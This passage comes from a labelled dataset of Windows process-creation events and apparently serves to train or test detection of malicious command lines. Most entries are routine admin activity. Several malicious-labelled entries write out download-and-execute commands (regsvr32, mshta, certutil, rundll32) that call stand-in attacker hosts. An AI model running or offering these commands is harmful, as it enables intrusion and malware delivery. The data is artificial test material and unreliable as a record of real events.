    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 14274,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T16:35:19.533Z",
    "ProcessGuid": "{A91672AC-38EC-4B3C-9D7E-CD0774A022F0}",
    "ProcessId": 23328,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer wsus_update /download /priority normal http://sccm01.corp.local/update_kb4585870.cab C:\\Windows\\SoftwareDistribution\\Download\\update_kb4585870.cab",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
    "ParentProcessId": 50613,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T13:13:29.982Z",
    "ProcessGuid": "{A23A8838-8071-4693-B068-F354B83D7F25}",
    "ProcessId": 40289,
    "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
    "CommandLine": "wmic.exe computersystem get model,manufacturer,totalphysicalmemory",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 22525,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T15:11:10.686Z",
    "ProcessGuid": "{CEFF57A5-E2F0-4E55-B719-8EE4AF5CA26D}",
    "ProcessId": 61468,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s /n /u /i:http://stager3419.top/file55.sct scrobj.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 3825,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.010",
    "technique_name": "Regsvr32 Squiblydoo",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-05T13:25:55.702Z",
    "ProcessGuid": "{2569E635-4EB4-4932-AC93-224629DD51D2}",
    "ProcessId": 51849,
    "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "CommandLine": "msedge.exe --type=gpu-process",
    "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
    "ParentProcessId": 12455,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T10:28:02.946Z",
    "ProcessGuid": "{198E083B-5DDC-40D4-A2B2-F09859EF355B}",
    "ProcessId": 54619,
    "Image": "C:\\Program Files\\nodejs\\node.exe",
    "CommandLine": "node.exe server.js",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 16301,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:06:10.645Z",
    "ProcessGuid": "{34C87C40-273D-435E-B404-53844C35FD72}",
    "ProcessId": 8737,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,0",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 58073,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-07T03:00:07.560Z",
    "ProcessGuid": "{390FFEF3-A70C-4F70-B0B7-5B2DE0492DD0}",
    "ProcessId": 23849,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -Command \"Invoke-GPUpdate -Computer DC01 -Force\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 5427,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-02T16:02:24.676Z",
    "ProcessGuid": "{AB465630-F8CE-4666-820F-96C5AF0260D8}",
    "ProcessId": 13517,
    "Image": "C:\\Windows\\System32\\mshta.exe",
    "CommandLine": "mshta.exe http://apt-infra1495.cc/payloads/script548.hta",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "explorer.exe",
    "ParentProcessId": 20586,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.005",
    "technique_name": "Mshta Remote HTA",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T12:59:40.545Z",
    "ProcessGuid": "{8B8360AD-EC29-4A6E-BE62-33571E124121}",
    "ProcessId": 54014,
    "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe",
    "CommandLine": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\core721.csproj",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 41266,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1127.001",
    "technique_name": "MSBuild Inline Task",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T15:44:25.889Z",
    "ProcessGuid": "{82737D26-B794-45B1-838A-4C58FD903FAC}",
    "ProcessId": 44104,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ADUser -Filter * -Properties LastLogonDate, Department, Title | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Select Name, SamAccountName, LastLogonDate, Department | Export-Csv C:\\Reports\\stale_accounts.csv -NoTypeInformation\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 64294,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-05T06:24:26.464Z",
    "ProcessGuid": "{4B85BF98-FC71-4D21-BAA7-DEDEF88AEEF9}",
    "ProcessId": 23340,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 11315,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T04:00:55.642Z",
    "ProcessGuid": "{7F3CEA07-D7F3-497E-AEB5-FA193C7956E6}",
    "ProcessId": 5633,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c update466.exe\")",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 26223,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.011",
    "technique_name": "Rundll32 JavaScript",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T15:45:28.572Z",
    "ProcessGuid": "{94ECA7DB-CAD9-4817-99BF-CDF0058CD368}",
    "ProcessId": 20314,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 36568,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:59:17.561Z",
    "ProcessGuid": "{B143EDAD-9643-4AF6-A938-9006A52610ED}",
    "ProcessId": 30153,
    "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "CommandLine": "firefox.exe -contentproc -childID 7",
    "ParentImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"",
    "ParentProcessId": 9854,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T08:27:12.705Z",
    "ProcessGuid": "{9CB35F44-1594-4496-84EC-B73DCDD3B343}",
    "ProcessId": 60598,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 9645,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T14:40:19.743Z",
    "ProcessGuid": "{6D57C823-1180-42B2-8F0D-91665CE42ECE}",
    "ProcessId": 46838,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 50494,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T21:22:51.554Z",
    "ProcessGuid": "{A0323B26-9D68-46C7-997E-6539F82E2A64}",
    "ProcessId": 28131,
    "Image": "C:\\Windows\\System32\\wuauclt.exe",
    "CommandLine": "wuauclt.exe /detectnow /updatenow",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 64616,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T13:28:56.233Z",
    "ProcessGuid": "{C33F2DCE-17E2-4A1A-A535-540F36C5BB12}",
    "ProcessId": 28119,
    "Image": "C:\\Windows\\System32\\taskhostw.exe",
    "CommandLine": "taskhostw.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 23212,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T20:36:39.061Z",
    "ProcessGuid": "{48BFE1C5-B236-48B9-83AF-6CAF0534CB21}",
    "ProcessId": 40952,
    "Image": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "CommandLine": "Code.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 63921,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:46:53.195Z",
    "ProcessGuid": "{B84E5E4C-FED7-44D3-A01A-70E9549EB978}",
    "ProcessId": 4377,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c tracert 8.8.8.8",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 18593,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T17:50:41.774Z",
    "ProcessGuid": "{7BF38384-DAD6-4F03-94F9-A0B3DD687170}",
    "ProcessId": 23761,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 53790,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T13:27:26.478Z",
    "ProcessGuid": "{F6CE2608-EBE7-40E0-B4E6-32E9F2BD1BBB}",
    "ProcessId": 57612,
    "Image": "C:\\Windows\\System32\\calc.exe",
    "CommandLine": "calc.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 48780,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:40:12.635Z",
    "ProcessGuid": "{D0CCCC5A-2484-4AB8-9979-4EBE697B5577}",
    "ProcessId": 17425,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 45417,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T10:26:01.880Z",
    "ProcessGuid": "{28C93005-3645-4C4F-916D-6C191DC9AFB0}",
    "ProcessId": 35596,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /create /tn \"NightlyBackup\" /tr \"C:\\Scripts\\backup.bat\" /sc daily /st 02:00",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 21799,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T12:48:59.448Z",
    "ProcessGuid": "{6AF6E817-163E-4528-A6AA-50056443C9B3}",
    "ProcessId": 25996,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe diskmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 26894,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:35:21.686Z",
    "ProcessGuid": "{F04258AE-F51E-4C49-A955-9FE9BCCAB2A2}",
    "ProcessId": 9010,
    "Image": "C:\\Windows\\System32\\taskhostw.exe",
    "CommandLine": "taskhostw.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 27922,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T12:38:33.301Z",
    "ProcessGuid": "{9286A1E6-90BB-45E5-B4DB-A3182D42D79E}",
    "ProcessId": 30734,
    "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "CommandLine": "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 34131,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T09:33:16.385Z",
    "ProcessGuid": "{AD150113-7B85-4801-9966-9F0377ED6C7E}",
    "ProcessId": 64745,
    "Image": "C:\\Windows\\System32\\eventvwr.exe",
    "CommandLine": "eventvwr.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 60457,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T09:57:20.496Z",
    "ProcessGuid": "{AA31F8C5-4AE5-468D-B2D8-01842C9A029F}",
    "ProcessId": 57804,
    "Image": "C:\\Program Files\\Git\\bin\\git.exe",
    "CommandLine": "git.exe pull origin main",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 40131,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T10:03:42.057Z",
    "ProcessGuid": "{4FC38F6F-B47D-493C-B2FB-40D1B90DF558}",
    "ProcessId": 14100,
    "Image": "C:\\Windows\\regedit.exe",
    "CommandLine": "regedit.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 18496,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T19:28:04.503Z",
    "ProcessGuid": "{19650D4D-93EF-4743-9502-0F1DE40F4582}",
    "ProcessId": 65187,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -urlcache -f http://exploit-kit4226.org/svc284.exe C:\\Users\\Public\\update392.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 61855,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1105",
    "technique_name": "Certutil Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T17:32:33.715Z",
    "ProcessGuid": "{D1FBEF64-2026-4CAC-8E16-D11D8473215C}",
    "ProcessId": 16182,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe https://sharepoint.corp.local/sites/team",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentProcessId": 41317,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T10:08:00.195Z",
    "ProcessGuid": "{3520D76F-CAF1-432A-A473-9ED2B3DD7D99}",
    "ProcessId": 8334,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -Command \"Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\\Reports\\servers.csv\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 54475,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T13:57:59.815Z",
    "ProcessGuid": "{456E6732-0C8B-444D-B49F-A5F9C7D44669}",
    "ProcessId": 64713,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 57407,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T22:12:45.071Z",
    "ProcessGuid": "{A465A216-FD34-4AE2-873B-163BBA88C90D}",
    "ProcessId": 4003,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 44336,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T21:06:33.106Z",
    "ProcessGuid": "{74245DDB-2BA1-4C98-B4ED-5E10B9BCCA68}",
    "ProcessId": 45924,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -urlcache -split -f http://darkops9655.xyz/module346.exe C:\\Users\\Public\\core707.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 30225,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1105",
    "technique_name": "Certutil Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T16:13:35.332Z",
    "ProcessGuid": "{3D4233D6-D524-4CEC-ADE3-BE7237F733F3}",
    "ProcessId": 44399,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ping 8.8.8.8",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 32350,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
